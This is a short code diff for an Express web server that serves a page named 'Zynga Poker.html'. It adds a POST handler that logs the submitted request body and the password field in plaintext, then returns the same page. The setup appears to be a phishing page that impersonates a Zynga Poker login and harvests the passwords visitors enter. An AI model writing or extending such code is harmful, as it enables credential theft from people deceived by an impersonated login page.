@@ -28,6 +28,17 @@ app.get('/', (req, res,next) => {
     res.sendFile(__dirname + '/Zynga Poker.html')
 });
 
+app.post('/', (req, res,next) => {
+    console.log('Login client page');
+    console.log('==\t==\t==\t');
+    console.log('req : ' +req);
+    console.log('==\t==\t==\t');
+    console.log('req.body : ' +req.body);
+    console.log('==\t==\t==\t');
+    console.log('req.body.pass : ' +req.body.pass);
+    res.sendFile(__dirname + '/Zynga Poker.html')
+});
+
 app.get('/client', (req, res,next) => {
     console.log('opening client page');
     res.sendFile(__dirname + '/client.html')
